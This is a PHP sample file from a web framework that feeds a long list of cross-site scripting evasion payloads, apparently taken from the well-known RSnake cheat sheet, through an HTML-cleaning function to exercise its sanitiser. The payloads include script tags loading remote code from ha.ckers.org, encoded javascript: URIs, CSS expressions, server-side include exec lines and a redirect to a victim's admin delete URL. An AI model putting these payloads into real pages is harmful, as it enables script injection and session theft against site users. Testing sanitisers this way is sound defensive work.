<?php

/**
 * 框架使用样例－PinYin操作
 * 
 * @author suning <suning@corp.the9.com>
 * 
 * $Id: utilClean.php 723 2008-10-27 09:45:42Z libing $
 */

require_once('../../../common.inc.php');

import('util.Clean');

/* Default Module */
class utilClean extends Action   
{
	/**
	 * 显示登录页(默认Action)
	 */
	function doDefault() 
	{
$data = <<<EOF
//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
你大爷
'';!--"<XSS>=&{()}
你大爷
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
你大爷
<IMG SRC="javascript:alert('XSS');">
你大爷
<IMG SRC=javascript:alert('XSS')>
你大爷
<IMG SRC=JaVaScRiPt:alert('XSS')>
你大爷
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
你大爷
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
你大爷
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
你大爷
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
你大爷
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
你大爷
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
你大爷
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
你大爷
<IMG SRC="jav	ascript:alert('XSS');">
你大爷
<IMG SRC="jav&#x09;ascript:alert('XSS');">
你大爷
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
你大爷
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
你大爷
<IMG
SRC
=
"
j
a
v
a
s
c
r
i
p
t
:
a
l
e
r
t
(
'
X
S
S
'
)
"
>

你大爷
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
你大爷
perl -e 'print "<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>";' > out
你大爷
<IMG SRC=" &#14;  javascript:alert('XSS');">
你大爷
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
你大爷
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
你大爷
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
你大爷
<<SCRIPT>alert("XSS");//<</SCRIPT>
你大爷
<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
你大爷
<SCRIPT SRC=//ha.ckers.org/.j>
你大爷
<IMG SRC="javascript:alert('XSS')"
你大爷
<iframe src=http://ha.ckers.org/scriptlet.html <
你大爷
<SCRIPT>a=/XSS/
alert(a.source)</SCRIPT>
你大爷
\";alert('XSS');//
你大爷
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
你大爷
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
你大爷
<BODY BACKGROUND="javascript:alert('XSS')">
你大爷
<BODY ONLOAD=alert('XSS')>
你大爷
<IMG DYNSRC="javascript:alert('XSS')">
你大爷
<IMG LOWSRC="javascript:alert('XSS')">
你大爷
<BGSOUND SRC="javascript:alert('XSS');">
你大爷
<BR SIZE="&{alert('XSS')}">
你大爷
<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
你大爷
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
你大爷
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
你大爷
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
你大爷
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
你大爷
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
你大爷
<XSS STYLE="behavior: url(xss.htc);">
你大爷
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
你大爷
<IMG SRC='vbscript:msgbox("XSS")'>
你大爷
<IMG SRC="mocha:[code]">
你大爷
<IMG SRC="livescript:[code]">
你大爷
¼script¾alert(¢XSS¢)¼/script¾
你大爷
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
你大爷
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
你大爷
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
你大爷
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
你大爷
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
你大爷
<TABLE BACKGROUND="javascript:alert('XSS')">
你大爷
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
你大爷
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
你大爷
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
你大爷
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
你大爷
<DIV STYLE="width: expression(alert('XSS'));">
你大爷
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
你大爷
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
你大爷
<XSS STYLE="xss:expression(alert('XSS'))">
你大爷
exp/*<A STYLE='no\xss:noxss("*//*");
xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
你大爷
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
你大爷
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
你大爷
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
你大爷
<!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]-->
你大爷
<BASE HREF="javascript:alert('XSS');//">
你大爷
<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
你大爷
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
你大爷
<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
你大爷
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
你大爷
a="get";
b="URL(\"";
c="javascript:";
d="alert('XSS');\")";
eval(a+b+c+d);
你大爷
<HTML xmlns:xss>
  <?import namespace="xss" implementation="http://ha.ckers.org/xss.htc">
  <xss:xss>XSS</xss:xss>
</HTML>
你大爷
<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
你大爷
<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML>
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
你大爷
<XML SRC="xsstest.xml" ID=I></XML>
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
你大爷
<HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;">
</BODY></HTML>
你大爷
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
你大爷
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
你大爷
<? echo('<SCR)';
echo('IPT>alert("XSS")</SCRIPT>'); ?>
你大爷
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
你大爷
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
你大爷
<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
你大爷
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
你大爷
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
你大爷
<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
你大爷
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
你大爷
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
你大爷
<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
你大爷
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
你大爷
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
你大爷
<A HREF="http://66.102.7.147/">XSS</A>
你大爷
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
你大爷
<A HREF="http://1113982867/">XSS</A>
你大爷
<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
你大爷
<A HREF="http://0102.0146.0007.00000223/">XSS</A>
你大爷
<A HREF="h
tt	p://6&#9;6.000146.0x7.147/">XSS</A>
你大爷
<A HREF="//www.google.com/">XSS</A>
你大爷
<A HREF="//google">XSS</A>
你大爷
<A HREF="http://ha.ckers.org@google">XSS</A>
你大爷
<A HREF="http://google:ha.ckers.org">XSS</A>
你大爷
<A HREF="http://google.com/">XSS</A>
你大爷
<A HREF="http://www.google.com./">XSS</A>
你大爷
<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
你大爷
<A HREF="http://www.gohttp://www.google.com/ogle.com/">XSS</A>
你大爷
<
%3C
&lt
&lt;
&LT
&LT;
&#60
&#060
&#0060
&#00060
&#000060
&#0000060
&#60;
&#060;
&#0060;
&#00060;
&#000060;
&#0000060;
&#x3c
&#x03c
&#x003c
&#x0003c
&#x00003c
&#x000003c
&#x3c;
&#x03c;
&#x003c;
&#x0003c;
&#x00003c;
&#x000003c;
&#X3c
&#X03c
&#X003c
&#X0003c
&#X00003c
&#X000003c
&#X3c;
&#X03c;
&#X003c;
&#X0003c;
&#X00003c;
&#X000003c;
&#x3C
&#x03C
&#x003C
&#x0003C
&#x00003C
&#x000003C
&#x3C;
&#x03C;
&#x003C;
&#x0003C;
&#x00003C;
&#x000003C;
&#X3C
&#X03C
&#X003C
&#X0003C
&#X00003C
&#X000003C
&#X3C;
&#X03C;
&#X003C;
&#X0003C;
&#X00003C;
&#X000003C;
\x3c
\x3C
\u003c
\u003C
你大爷
EOF;
//echo $data;
    echo Clean::htmlSafe($data);
	}
}

$app->run();
?>